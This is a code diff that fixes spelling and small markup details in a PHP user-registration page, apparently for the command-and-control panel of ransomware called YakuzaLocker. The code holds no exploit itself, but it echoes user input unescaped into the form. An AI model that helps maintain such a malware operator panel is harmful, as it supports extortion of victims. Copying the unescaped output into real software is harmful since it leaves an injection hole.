@@ -2,6 +2,7 @@
 
 // Step 1: Start Session and Include Database Connections
 
+global $pdo;
 session_start();
 
 require_once "../includes/db.php";
@@ -12,8 +13,8 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
     exit;
 }
 
-$username = $password = $confrim_password = "";
-$username_err = $password_err = $confrim_password_err = "";
+$username = $password = $confirm_password = "";
+$username_err = $password_err = $confirm_password_err = "";
 
 // Step 3: Process login form submission
 
@@ -51,20 +52,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $password = trim($_POST["password"]);
     }
     
-    // Step 3.3: Validate confrimation password
-    if (empty(trim($_POST["confrim_password"]))) {
-        $confrim_password_err = "Please Confrim password.";     
+    // Step 3.3: Validate confirmation password
+    if (empty(trim($_POST["confirm_password"]))) {
+        $confirm_password_err = "Please confirm password.";
     } else {
-        $confrim_password = trim($_POST["confrim_password"]);
-        if (empty($password_err) && ($password != $confrim_password)) {
-            $confrim_password_err = "Password did not match.";
+        $confirm_password = trim($_POST["confirm_password"]);
+        if (empty($password_err) && ($password != $confirm_password)) {
+            $confirm_password_err = "Password did not match.";
         }
     }
 
 
 
     // Step 4: Insert user data into the database
-    if (empty($username_err) && empty($password_err) && empty($confrim_password_err)) {
+    if (empty($username_err) && empty($password_err) && empty($confirm_password_err)) {
         $sql = "INSERT INTO users (username, password) VALUES (:username, :password)";
         if ($stmt = $pdo->prepare($sql)) {
             $stmt->bindParam(":username", $param_username, PDO::PARAM_STR);
@@ -87,9 +88,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 }
 ?>
 
-<!-- Step 5: HTML Structure for registration form -->
+<!-- Step 5: HTML Structure for a registration form -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <title>Register YakuzaLocker Command & Control</title>
     <link rel="stylesheet" href="../assets/css/register.css">
@@ -110,9 +111,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 <span><?php echo $password_err; ?></span>
             </div>
             <div>
-                <label>Confrim Password</label>
-                <input type="password" name="confrim_password" value="<?php echo $confrim_password; ?>">
-                <span><?php echo $confrim_password_err; ?></span>
+                <label>Confirm Password</label>
+                <input type="password" name="confirm_password" value="<?php echo $confirm_password; ?>">
+                <span><?php echo $confirm_password_err; ?></span>
             </div>
             <div>
                 <input type="submit" value="Register">
